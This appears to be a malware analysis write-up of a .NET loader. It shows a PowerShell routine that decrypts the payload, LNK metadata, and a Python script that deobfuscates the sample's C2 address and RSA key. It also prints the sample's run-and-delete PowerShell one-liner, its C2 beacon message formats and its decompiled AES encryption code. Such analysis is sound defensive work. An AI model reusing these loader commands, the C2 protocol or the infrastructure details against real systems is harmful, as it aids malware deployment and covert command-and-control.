### Decryption Method

```powershell
$A=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
$A.Key=@([byte]136,73,144,47,247,21,226,78,180,232,213,236,64,96,75,124,93,169,166,96,59,183,0,9,92,111,215,57,42,135,120,223);
$A.IV=@([byte]146,129,15,39,90,248,116,78,170,149,152,187,185,81,42,108);
$F=[Convert]::FromBase64String([IO.File]::ReadAllText('<b64encodeddata>'));
$decrypted = $A.CreateDecryptor().TransformFinalBlock($F,0,$F.Length)
$A.Dispose(); [system.io.file]::writeallbytes("malicious.dll", $decrypted);
```

### shortcut

```
exiftool sample.lnk 
ExifTool Version Number         : 12.30
File Name                       : sample.lnk
Directory                       : .
File Size                       : 922 bytes
File Modification Date/Time     : 2022:11:11 15:57:50-05:00
File Access Date/Time           : 2022:11:11 15:58:14-05:00
File Inode Change Date/Time     : 2022:11:11 15:58:08-05:00
File Permissions                : -rw-rw-r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, Unicode
File Attributes                 : Archive
Create Date                     : 2022:11:11 16:53:05-05:00
Access Date                     : 2022:11:11 16:53:05-05:00
Modify Date                     : 2022:11:11 16:53:05-05:00
Target File Size                : 868376
Icon Index                      : (none)
Run Window                      : Show Minimized No Activate
Hot Key                         : (none)
Drive Type                      : Fixed Disk
Volume Label                    : Windows
Local Base Path                 : C:\Users\Admin\WudymwJDoCjkbnXg.IXjCkhaNCPisIZdibgvJCLTkTK
Relative Path                   : ..\..\..\..\..\..\..\WudymwJDoCjkbnXg.IXjCkhaNCPisIZdibgvJCLTkTK
```

### Output
```
./malicious.dll
6ac3dc3f86c084c18f16fb8bac1278121952a270153438c344e7365fb89cafad
```

### Deobfuscation Method to retrieve c2 and rsa key

```py
def string1(): 
    arg = ""
    num = 83555
    arg += chr(num + -83451)
    num2 = 51919
    arg += chr(num2 + -51803)
    num3 = 92922
    arg += chr(num3 + -92806)
    num4 = 79352
    arg += chr(num4 + -79240)
    num5 = 81661
    arg += chr(num5 + -81603)
    num6 = 1041
    arg += chr(num6 + -994)
    num7 = 22879
    arg += chr(num7 + -22832)
    num8 = 67472
    arg += chr(num8 + -67416)
    num9 = 96581
    arg += chr(num9 + -96528)
    num10 = 22623
    arg += chr(num10 + -22577)
    num11 = 1352
    arg += chr(num11 + -1303)
    num12 = 61660
    arg += chr(num12 + -61605)
    num13 = 47803
    arg += chr(num13 + -47757)
    num14 = 27833
    arg += chr(num14 + -27776)
    num15 = 88112
    arg += chr(num15 + -88066)
    num16 = 8541
    arg += chr(num16 + -8490)
    num17 = 14337
    return arg + chr(num17 + -14287)

def string2():
    arg = ""
    num = 20562
    arg += chr(num + -20502)
    num2 = 79320
    arg += chr(num2 + -79238)
    num3 = 89412
    arg += chr(num3 + -89329)
    num4 = 83431
    arg += chr(num4 + -83366)
    num5 = 82258
    arg += chr(num5 + -82183)
    num6 = 72616
    arg += chr(num6 + -72515)
    num7 = 93505
    arg += chr(num7 + -93384)
    num8 = 87159
    arg += chr(num8 + -87073)
    num9 = 71360
    arg += chr(num9 + -71263)
    num10 = 82049
    arg += chr(num10 + -81941)
    num11 = 7577
    arg += chr(num11 + -7460)
    num12 = 1668
    arg += chr(num12 + -1567)
    num13 = 61652
    arg += chr(num13 + -61590)
    num14 = 87064
    arg += chr(num14 + -87004)
    num15 = 40996
    arg += chr(num15 + -40919)
    num16 = 72181
    arg += chr(num16 + -72070)
    num17 = 86742
    arg += chr(num17 + -86642)
    num18 = 70677
    arg += chr(num18 + -70560)
    num19 = 47040
    arg += chr(num19 + -46932)
    num20 = 13589
    arg += chr(num20 + -13472)
    num21 = 39362
    arg += chr(num21 + -39247)
    num22 = 43345
    arg += chr(num22 + -43283)
    num23 = 74682
    arg += chr(num23 + -74567)
    num24 = 59
    arg += chr(num24 + 41)
    num25 = 31731
    arg += chr(num25 + -31615)
    num26 = 56493
    arg += chr(num26 + -56416)
    num27 = 9283
    arg += chr(num27 + -9231)
    num28 = 77228
    arg += chr(num28 + -77155)
    num29 = 3147
    arg += chr(num29 + -3038)
    num30 = 77001
    arg += chr(num30 + -76892)
    num31 = 79854
    arg += chr(num31 + -79764)
    num32 = 80994
    arg += chr(num32 + -80920)
    num33 = 56247
    arg += chr(num33 + -56158)
    num34 = 85019
    arg += chr(num34 + -84972)
    num35 = 99932
    arg += chr(num35 + -99822)
    num36 = 76855
    arg += chr(num36 + -76738)
    num37 = 56447
    arg += chr(num37 + -56333)
    num38 = 29736
    arg += chr(num38 + -29665)
    num39 = 90608
    arg += chr(num39 + -90486)
    num40 = 65124
    arg += chr(num40 + -65077)
    num41 = 88906
    arg += chr(num41 + -88784)
    num42 = 56113
    arg += chr(num42 + -55997)
    num43 = 50815
    arg += chr(num43 + -50694)
    num44 = 94518
    arg += chr(num44 + -94411)
    num45 = 36590
    arg += chr(num45 + -36521)
    num46 = 27206
    arg += chr(num46 + -27132)
    num47 = 56611
    arg += chr(num47 + -56513)
    num48 = 40722
    arg += chr(num48 + -40607)
    num49 = 4651
    arg += chr(num49 + -4564)
    num50 = 34321
    arg += chr(num50 + -34200)
    num51 = 71837
    arg += chr(num51 + -71722)
    num52 = 82337
    arg += chr(num52 + -82267)
    num53 = 45704
    arg += chr(num53 + -45591)
    num54 = 50476
    arg += chr(num54 + -50398)
    num55 = 80385
    arg += chr(num55 + -80301)
    num56 = 81039
    arg += chr(num56 + -80986)
    num57 = 93034
    arg += chr(num57 + -92959)
    num58 = 26251
    arg += chr(num58 + -26181)
    num59 = 86237
    arg += chr(num59 + -86129)
    num60 = 64580
    arg += chr(num60 + -64514)
    num61 = 19810
    arg += chr(num61 + -19697)
    num62 = 3283
    arg += chr(num62 + -3184)
    num63 = 53779
    arg += chr(num63 + -53711)
    num64 = 88473
    arg += chr(num64 + -88376)
    num65 = 30979
    arg += chr(num65 + -30925)
    num66 = 90590
    arg += chr(num66 + -90525)
    num67 = 50906
    arg += chr(num67 + -50834)
    num68 = 70917
    arg += chr(num68 + -70815)
    num69 = 47156
    arg += chr(num69 + -47059)
    num70 = 14911
    arg += chr(num70 + -14855)
    num71 = 48300
    arg += chr(num71 + -48217)
    num72 = 13422
    arg += chr(num72 + -13321)
    num73 = 99458
    arg += chr(num73 + -99353)
    num74 = 99839
    arg += chr(num74 + -99750)
    num75 = 2926
    arg += chr(num75 + -2857)
    num76 = 505
    arg += chr(num76 + -431)
    num77 = 98304
    arg += chr(num77 + -98236)
    num78 = 52534
    arg += chr(num78 + -52460)
    num79 = 41341
    arg += chr(num79 + -41298)
    num80 = 6872
    arg += chr(num80 + -6801)
    num81 = 79653
    arg += chr(num81 + -79603)
    num82 = 45748
    arg += chr(num82 + -45628)
    num83 = 4817
    arg += chr(num83 + -4702)
    num84 = 11969
    arg += chr(num84 + -11864)
    num85 = 53529
    arg += chr(num85 + -53428)
    num86 = 79863
    arg += chr(num86 + -79793)
    num87 = 52775
    arg += chr(num87 + -52661)
    num88 = 13754
    arg += chr(num88 + -13686)
    num89 = 98388
    arg += chr(num89 + -98339)
    num90 = 19948
    arg += chr(num90 + -19851)
    num91 = 99860
    arg += chr(num91 + -99806)
    num92 = 36980
    arg += chr(num92 + -36930)
    num93 = 5352
    arg += chr(num93 + -5278)
    num94 = 43176
    arg += chr(num94 + -43067)
    num95 = 84841
    arg += chr(num95 + -84722)
    num96 = 79114
    arg += chr(num96 + -78992)
    num97 = 56340
    arg += chr(num97 + -56227)
    num98 = 25984
    arg += chr(num98 + -25903)
    num99 = 42398
    arg += chr(num99 + -42323)
    num100 = 80367
    arg += chr(num100 + -80280)
    num101 = 79543
    arg += chr(num101 + -79421)
    num102 = 34227
    arg += chr(num102 + -34180)
    num103 = 97471
    arg += chr(num103 + -97392)
    num104 = 7539
    arg += chr(num104 + -7488)
    num105 = 17337
    arg += chr(num105 + -17268)
    num106 = 8443
    arg += chr(num106 + -8339)
    num107 = 27609
    arg += chr(num107 + -27503)
    num108 = 35046
    arg += chr(num108 + -34929)
    num109 = 91568
    arg += chr(num109 + -91489)
    num110 = 54893
    arg += chr(num110 + -54773)
    num111 = 81628
    arg += chr(num111 + -81542)
    num112 = 63053
    arg += chr(num112 + -62981)
    num113 = 40610
    arg += chr(num113 + -40544)
    num114 = 78791
    arg += chr(num114 + -78672)
    num115 = 67600
    arg += chr(num115 + -67511)
    num116 = 10743
    arg += chr(num116 + -10668)
    num117 = 76446
    arg += chr(num117 + -76395)
    num118 = 47034
    arg += chr(num118 + -46953)
    num119 = 46983
    arg += chr(num119 + -46868)
    num120 = 75703
    arg += chr(num120 + -75582)
    num121 = 95828
    arg += chr(num121 + -95778)
    num122 = 33722
    arg += chr(num122 + -33614)
    num123 = 43676
    arg += chr(num123 + -43568)
    num124 = 38387
    arg += chr(num124 + -38281)
    num125 = 59771
    arg += chr(num125 + -59700)
    num126 = 62297
    arg += chr(num126 + -62182)
    num127 = 52313
    arg += chr(num127 + -52212)
    num128 = 67188
    arg += chr(num128 + -67105)
    num129 = 87166
    arg += chr(num129 + -87085)
    num130 = 93214
    arg += chr(num130 + -93108)
    num131 = 35055
    arg += chr(num131 + -34973)
    num132 = 27468
    arg += chr(num132 + -27393)
    num133 = 46125
    arg += chr(num133 + -46040)
    num134 = 61675
    arg += chr(num134 + -61559)
    num135 = 92278
    arg += chr(num135 + -92174)
    num136 = 44680
    arg += chr(num136 + -44593)
    num137 = 87258
    arg += chr(num137 + -87138)
    num138 = 65115
    arg += chr(num138 + -65067)
    num139 = 13599
    arg += chr(num139 + -13479)
    num140 = 70058
    arg += chr(num140 + -70006)
    num141 = 61989
    arg += chr(num141 + -61912)
    num142 = 86623
    arg += chr(num142 + -86519)
    num143 = 42131
    arg += chr(num143 + -42034)
    num144 = 95096
    arg += chr(num144 + -94990)
    num145 = 46519
    arg += chr(num145 + -46439)
    num146 = 37119
    arg += chr(num146 + -37038)
    num147 = 66467
    arg += chr(num147 + -66349)
    num148 = 85806
    arg += chr(num148 + -85727)
    num149 = 53006
    arg += chr(num149 + -52951)
    num150 = 33032
    arg += chr(num150 + -32982)
    num151 = 5731
    arg += chr(num151 + -5619)
    num152 = 14604
    arg += chr(num152 + -14517)
    num153 = 48924
    arg += chr(num153 + -48813)
    num154 = 65480
    arg += chr(num154 + -65395)
    num155 = 31613
    arg += chr(num155 + -31543)
    num156 = 16328
    arg += chr(num156 + -16279)
    num157 = 87630
    arg += chr(num157 + -87527)
    num158 = 96130
    arg += chr(num158 + -96079)
    num159 = 39954
    arg += chr(num159 + -39877)
    num160 = 53761
    arg += chr(num160 + -53677)
    num161 = 32589
    arg += chr(num161 + -32511)
    num162 = 56315
    arg += chr(num162 + -56234)
    num163 = 85644
    arg += chr(num163 + -85545)
    num164 = 75084
    arg += chr(num164 + -75034)
    num165 = 22407
    arg += chr(num165 + -22292)
    num166 = 57016
    arg += chr(num166 + -56934)
    num167 = 47611
    arg += chr(num167 + -47557)
    num168 = 8570
    arg += chr(num168 + -8458)
    num169 = 66615
    arg += chr(num169 + -66536)
    num170 = 43721
    arg += chr(num170 + -43599)
    num171 = 38731
    arg += chr(num171 + -38646)
    num172 = 71166
    arg += chr(num172 + -71094)
    num173 = 8831
    arg += chr(num173 + -8755)
    num174 = 22288
    arg += chr(num174 + -22180)
    num175 = 66631
    arg += chr(num175 + -66575)
    num176 = 78439
    arg += chr(num176 + -78333)
    num177 = 58457
    arg += chr(num177 + -58392)
    num178 = 96691
    arg += chr(num178 + -96587)
    num179 = 54288
    arg += chr(num179 + -54245)
    num180 = 585
    arg += chr(num180 + -478)
    num181 = 15905
    arg += chr(num181 + -15826)
    num182 = 78812
    arg += chr(num182 + -78703)
    num183 = 86980
    arg += chr(num183 + -86871)
    num184 = 89699
    arg += chr(num184 + -89623)
    num185 = 10359
    arg += chr(num185 + -10237)
    num186 = 79173
    arg += chr(num186 + -79123)
    num187 = 34935
    arg += chr(num187 + -34818)
    num188 = 38824
    arg += chr(num188 + -38715)
    num189 = 84196
    arg += chr(num189 + -84110)
    num190 = 370
    arg += chr(num190 + -254)
    num191 = 76700
    arg += chr(num191 + -76634)
    num192 = 36705
    arg += chr(num192 + -36639)
    num193 = 73338
    arg += chr(num193 + -73268)
    num194 = 85651
    arg += chr(num194 + -85544)
    num195 = 78741
    arg += chr(num195 + -78621)
    num196 = 390
    arg += chr(num196 + -282)
    num197 = 49988
    arg += chr(num197 + -49923)
    num198 = 87526
    arg += chr(num198 + -87418)
    num199 = 21917
    arg += chr(num199 + -21805)
    num200 = 87205
    arg += chr(num200 + -87117)
    num201 = 57844
    arg += chr(num201 + -57740)
    num202 = 67109
    arg += chr(num202 + -67001)
    num203 = 89847
    arg += chr(num203 + -89728)
    num204 = 24712
    arg += chr(num204 + -24596)
    num205 = 81926
    arg += chr(num205 + -81819)
    num206 = 95212
    arg += chr(num206 + -95097)
    num207 = 20742
    arg += chr(num207 + -20689)
    num208 = 77766
    arg += chr(num208 + -77712)
    num209 = 96844
    arg += chr(num209 + -96743)
    num210 = 24236
    arg += chr(num210 + -24114)
    num211 = 34942
    arg += chr(num211 + -34823)
    num212 = 97580
    arg += chr(num212 + -97527)
    num213 = 6606
    arg += chr(num213 + -6532)
    num214 = 2259
    arg += chr(num214 + -2180)
    num215 = 33314
    arg += chr(num215 + -33217)
    num216 = 55400
    arg += chr(num216 + -55292)
    num217 = 26544
    arg += chr(num217 + -26471)
    num218 = 50832
    arg += chr(num218 + -50746)
    num219 = 26542
    arg += chr(num219 + -26462)
    num220 = 52913
    arg += chr(num220 + -52836)
    num221 = 44899
    arg += chr(num221 + -44810)
    num222 = 30061
    arg += chr(num222 + -29996)
    num223 = 29859
    arg += chr(num223 + -29774)
    num224 = 36005
    arg += chr(num224 + -35908)
    num225 = 18403
    arg += chr(num225 + -18319)
    num226 = 24074
    arg += chr(num226 + -23959)
    num227 = 83423
    arg += chr(num227 + -83339)
    num228 = 59775
    arg += chr(num228 + -59689)
    num229 = 74927
    arg += chr(num229 + -74877)
    num230 = 90020
    arg += chr(num230 + -89919)
    num231 = 52173
    arg += chr(num231 + -52062)
    num232 = 80737
    arg += chr(num232 + -80682)
    num233 = 35396
    arg += chr(num233 + -35347)
    num234 = 74938
    arg += chr(num234 + -74889)
    num235 = 43726
    arg += chr(num235 + -43658)
    num236 = 83514
    arg += chr(num236 + -83471)
    num237 = 56195
    arg += chr(num237 + -56127)
    num238 = 72002
    arg += chr(num238 + -71928)
    num239 = 86865
    arg += chr(num239 + -86749)
    num240 = 78020
    arg += chr(num240 + -77952)
    num241 = 52445
    arg += chr(num241 + -52340)
    num242 = 28987
    arg += chr(num242 + -28883)
    num243 = 17676
    arg += chr(num243 + -17621)
    num244 = 33124
    arg += chr(num244 + -33051)
    num245 = 29968
    arg += chr(num245 + -29925)
    num246 = 73521
    arg += chr(num246 + -73437)
    num247 = 20889
    arg += chr(num247 + -20810)
    num248 = 53068
    arg += chr(num248 + -52990)
    num249 = 2136
    arg += chr(num249 + -2082)
    num250 = 38142
    arg += chr(num250 + -38090)
    num251 = 12198
    arg += chr(num251 + -12121)
    num252 = 31369
    arg += chr(num252 + -31321)
    num253 = 88688
    arg += chr(num253 + -88633)
    num254 = 712
    arg += chr(num254 + -608)
    num255 = 40453
    arg += chr(num255 + -40397)
    num256 = 14270
    arg += chr(num256 + -14157)
    num257 = 93442
    arg += chr(num257 + -93368)
    num258 = 78638
    arg += chr(num258 + -78565)
    num259 = 17935
    arg += chr(num259 + -17883)
    num260 = 30400
    arg += chr(num260 + -30333)
    num261 = 97686
    arg += chr(num261 + -97615)
    num262 = 52686
    arg += chr(num262 + -52643)
    num263 = 63707
    arg += chr(num263 + -63585)
    num264 = 49294
    arg += chr(num264 + -49189)
    num265 = 38121
    arg += chr(num265 + -38038)
    num266 = 97571
    arg += chr(num266 + -97500)
    num267 = 99625
    arg += chr(num267 + -99552)
    num268 = 44375
    arg += chr(num268 + -44253)
    num269 = 65561
    arg += chr(num269 + -65455)
    num270 = 99880
    arg += chr(num270 + -99763)
    num271 = 22912
    arg += chr(num271 + -22859)
    num272 = 61234
    arg += chr(num272 + -61191)
    num273 = 70787
    arg += chr(num273 + -70735)
    num274 = 79878
    arg += chr(num274 + -79759)
    num275 = 30940
    arg += chr(num275 + -30887)
    num276 = 64326
    arg += chr(num276 + -64239)
    num277 = 99520
    arg += chr(num277 + -99422)
    num278 = 40663
    arg += chr(num278 + -40581)
    num279 = 53336
    arg += chr(num279 + -53263)
    num280 = 64085
    arg += chr(num280 + -64030)
    num281 = 64583
    arg += chr(num281 + -64503)
    num282 = 12639
    arg += chr(num282 + -12591)
    num283 = 87297
    arg += chr(num283 + -87254)
    num284 = 69498
    arg += chr(num284 + -69417)
    num285 = 56085
    arg += chr(num285 + -56007)
    num286 = 69949
    arg += chr(num286 + -69841)
    num287 = 4974
    arg += chr(num287 + -4872)
    num288 = 59935
    arg += chr(num288 + -59831)
    num289 = 49768
    arg += chr(num289 + -49686)
    num290 = 26493
    arg += chr(num290 + -26421)
    num291 = 41334
    arg += chr(num291 + -41216)
    num292 = 80887
    arg += chr(num292 + -80833)
    num293 = 31138
    arg += chr(num293 + -31070)
    num294 = 97342
    arg += chr(num294 + -97260)
    num295 = 73063
    arg += chr(num295 + -73011)
    num296 = 12923
    arg += chr(num296 + -12845)
    num297 = 69668
    arg += chr(num297 + -69621)
    num298 = 61038
    arg += chr(num298 + -60929)
    num299 = 57411
    arg += chr(num299 + -57321)
    num300 = 87779
    arg += chr(num300 + -87668)
    num301 = 65999
    arg += chr(num301 + -65895)
    num302 = 23587
    arg += chr(num302 + -23466)
    num303 = 65214
    arg += chr(num303 + -65113)
    num304 = 82000
    arg += chr(num304 + -81900)
    num305 = 50695
    arg += chr(num305 + -50628)
    num306 = 19264
    arg += chr(num306 + -19189)
    num307 = 68661
    arg += chr(num307 + -68554)
    num308 = 48416
    arg += chr(num308 + -48303)
    num309 = 94161
    arg += chr(num309 + -94104)
    num310 = 3264
    arg += chr(num310 + -3184)
    num311 = 1847
    arg += chr(num311 + -1776)
    num312 = 18767
    arg += chr(num312 + -18666)
    num313 = 85206
    arg += chr(num313 + -85123)
    num314 = 40956
    arg += chr(num314 + -40887)
    num315 = 33337
    arg += chr(num315 + -33255)
    num316 = 53621
    arg += chr(num316 + -53519)
    num317 = 52691
    arg += chr(num317 + -52569)
    num318 = 22826
    arg += chr(num318 + -22742)
    num319 = 45145
    arg += chr(num319 + -45080)
    num320 = 28518
    arg += chr(num320 + -28445)
    num321 = 94500
    arg += chr(num321 + -94457)
    num322 = 97264
    arg += chr(num322 + -97210)
    num323 = 28935
    arg += chr(num323 + -28858)
    num324 = 65376
    arg += chr(num324 + -65323)
    num325 = 60501
    arg += chr(num325 + -60420)
    num326 = 90371
    arg += chr(num326 + -90302)
    num327 = 16114
    arg += chr(num327 + -16028)
    num328 = 19971
    arg += chr(num328 + -19906)
    num329 = 89430
    arg += chr(num329 + -89359)
    num330 = 47607
    arg += chr(num330 + -47486)
    num331 = 78351
    arg += chr(num331 + -78274)
    num332 = 68165
    arg += chr(num332 + -68113)
    num333 = 10774
    arg += chr(num333 + -10665)
    num334 = 62239
    arg += chr(num334 + -62122)
    num335 = 81574
    arg += chr(num335 + -81487)
    num336 = 38678
    arg += chr(num336 + -38597)
    num337 = 10697
    arg += chr(num337 + -10582)
    num338 = 15450
    arg += chr(num338 + -15394)
    num339 = 95076
    arg += chr(num339 + -95008)
    num340 = 20825
    arg += chr(num340 + -20736)
    num341 = 30548
    arg += chr(num341 + -30483)
    num342 = 36806
    arg += chr(num342 + -36699)
    num343 = 48568
    arg += chr(num343 + -48490)
    num344 = 22463
    arg += chr(num344 + -22349)
    num345 = 26160
    arg += chr(num345 + -26061)
    num346 = 7810
    arg += chr(num346 + -7706)
    num347 = 48614
    arg += chr(num347 + -48543)
    num348 = 81258
    arg += chr(num348 + -81172)
    num349 = 21637
    arg += chr(num349 + -21526)
    num350 = 96134
    arg += chr(num350 + -96032)
    num351 = 71011
    arg += chr(num351 + -70929)
    num352 = 20517
    arg += chr(num352 + -20420)
    num353 = 58295
    arg += chr(num353 + -58252)
    num354 = 15267
    arg += chr(num354 + -15192)
    num355 = 313
    arg += chr(num355 + -228)
    num356 = 84709
    arg += chr(num356 + -84593)
    num357 = 42144
    arg += chr(num357 + -42023)
    num358 = 17847
    arg += chr(num358 + -17782)
    num359 = 71645
    arg += chr(num359 + -71535)
    num360 = 7586
    arg += chr(num360 + -7501)
    num361 = 85751
    arg += chr(num361 + -85673)
    num362 = 76364
    arg += chr(num362 + -76247)
    num363 = 45009
    arg += chr(num363 + -44911)
    num364 = 2779
    arg += chr(num364 + -2660)
    num365 = 89253
    arg += chr(num365 + -89192)
    num366 = 69443
    arg += chr(num366 + -69382)
    num367 = 29013
    arg += chr(num367 + -28953)
    num368 = 85124
    arg += chr(num368 + -85077)
    num369 = 47539
    arg += chr(num369 + -47462)
    num370 = 96080
    arg += chr(num370 + -95969)
    num371 = 50723
    arg += chr(num371 + -50623)
    num372 = 43000
    arg += chr(num372 + -42883)
    num373 = 69962
    arg += chr(num373 + -69854)
    num374 = 29591
    arg += chr(num374 + -29474)
    num375 = 33688
    arg += chr(num375 + -33573)
    num376 = 51043
    arg += chr(num376 + -50981)
    num377 = 81447
    arg += chr(num377 + -81387)
    num378 = 55806
    arg += chr(num378 + -55737)
    num379 = 83786
    arg += chr(num379 + -83666)
    num380 = 61115
    arg += chr(num380 + -61003)
    num381 = 29882
    arg += chr(num381 + -29771)
    num382 = 49180
    arg += chr(num382 + -49070)
    num383 = 64926
    arg += chr(num383 + -64825)
    num384 = 96283
    arg += chr(num384 + -96173)
    num385 = 63711
    arg += chr(num385 + -63595)
    num386 = 6276
    arg += chr(num386 + -6214)
    num387 = 34435
    arg += chr(num387 + -34370)
    num388 = 38146
    arg += chr(num388 + -38065)
    num389 = 59966
    arg += chr(num389 + -59901)
    num390 = 54933
    arg += chr(num390 + -54867)
    num391 = 14217
    arg += chr(num391 + -14157)
    num392 = 19812
    arg += chr(num392 + -19765)
    num393 = 85403
    arg += chr(num393 + -85334)
    num394 = 86381
    arg += chr(num394 + -86261)
    num395 = 73067
    arg += chr(num395 + -72955)
    num396 = 43802
    arg += chr(num396 + -43691)
    num397 = 31881
    arg += chr(num397 + -31771)
    num398 = 80062
    arg += chr(num398 + -79961)
    num399 = 55148
    arg += chr(num399 + -55038)
    num400 = 49758
    arg += chr(num400 + -49642)
    num401 = 77467
    arg += chr(num401 + -77405)
    num402 = 77650
    arg += chr(num402 + -77590)
    num403 = 55774
    arg += chr(num403 + -55727)
    num404 = 36382
    arg += chr(num404 + -36300)
    num405 = 81930
    arg += chr(num405 + -81847)
    num406 = 77324
    arg += chr(num406 + -77259)
    num407 = 22154
    arg += chr(num407 + -22079)
    num408 = 64108
    arg += chr(num408 + -64007)
    num409 = 5858
    arg += chr(num409 + -5737)
    num410 = 60402
    arg += chr(num410 + -60316)
    num411 = 44948
    arg += chr(num411 + -44851)
    num412 = 49118
    arg += chr(num412 + -49010)
    num413 = 75035
    arg += chr(num413 + -74918)
    num414 = 58628
    arg += chr(num414 + -58527)
    num415 = 81743
    return arg + chr(num415 + -81681)

print(f"C2: {string1()}")
print(f"RSA Key: {string2()}")
```

```
python .\deobf.py
C2: http://85.17.9.32
RSA Key: <RSAKeyValue><Modulus>sdtM4ImmZJY/nurGz/ztykEJbsWysFqNT5KFlBqcDa6AHfa8SeiYEJDJ+G2xsieFrD1a62JmwzqQKWz/O3EhjuOxVHBwYK3Qsy2lljGseSQjRKUthWx0x4MhajPQvO72pWoUF1g3MTNQc2sR6pOzUHLl8jAh+kOmmLz2umVtBBFkxlAlpXhlwtks56ezw5JOalIVPMYAUaTsTV2eo711D+DJtDih7I+TON64M07h8qJI4CG+ziSGIzju5+4w5WbRI7P0+QNlfhRHv6DR4N/mZohyedCKkq9PGeSERfzTAI+6M5QEVAGyM4muWQs8DYAkNrchGVofRa+KUtyAnUNubw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
```

### Addition information scraped from dotnet payload
```
powershell -command "$f=<powershellpayload>';'$p=[IO.File]::ReadAllText($f);iex $p;[IO.File]::Delete($f)";
temp\randomnumbers.exe
{"action":"ping","hwid":"","version":"","workgroup":"? | ?","dns":0,"protocol_version":2}
{"action":"get_file","hwid":"","task_id":","protocol_version":2}
{"action":"change_status","hwid":"","arch":"","pc_name":"","rights":"","os_name":"Win","is_success","protocol_version":2}
```

```cs
Aes.Create();
typeof(Aes).GetProperty(KpjYnCQWCXnSKtS5ewxSHinLoN9XO5ZCr827ziok7rdK90TiEEKXw7EyqvsVnq.u_kVZn7gNBqbEhk9Lv_MyfRhzGbJ_O5hH7vq()).SetValue(aes, 128, null);
typeof(Aes).GetProperty(KpjYnCQWCXnSKtS5ewxSHinLoN9XO5ZCr827ziok7rdK90TiEEKXw7EyqvsVnq.F31ZOBKC7rsRqPc5bkSBvhwMKv0n3WvFhENsrQygVudf3_PybBEj8()).SetValue(aes, PNkUtmTtM4OQU6, null);
typeof(Aes).GetProperty(KpjYnCQWCXnSKtS5ewxSHinLoN9XO5ZCr827ziok7rdK90TiEEKXw7EyqvsVnq.x8Rf_sMp18mfBgp8vEpmEjYFSElqnVxEAVUoIsNjdsiVsWF8LBfvPSPvH5tnCoIl6j2cDaOcobhFrSTTxrbxq87ZXKXFhknlCejqp6NnX8()).SetValue(aes, CipherMode.CBC, null);
aes.GenerateIV();
MemoryStream memoryStream = new MemoryStream();
using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(aes.Key, aes.IV), CryptoStreamMode.Write))
{
				cryptoStream.Write(Q5hu4_Lz6oH5DOWrRGfr7_9yAx99sVsUtuIMAObHVl6mhr43SLPyhFDGBt9bmaIPwCrA5, 0, Q5hu4_Lz6oH5DOWrRGfr7_9yAx99sVsUtuIMAObHVl6mhr43SLPyhFDGBt9bmaIPwCrA5.Length);
				Thread thread3 = new Thread(delegate()
				{
					double num = 17238.875;
					Math.Cos(num / (num * 64536.5));
				});
				thread3.Start();
				thread3.Join();
}
byte[] array = memoryStream.ToArray();
byte[] array2 = new byte[aes.IV.Length + array.Length];
Buffer.BlockCopy(aes.IV, 0, array2, 0, aes.IV.Length);
Buffer.BlockCopy(array, 0, array2, aes.IV.Length, array.Length);
return array2;
```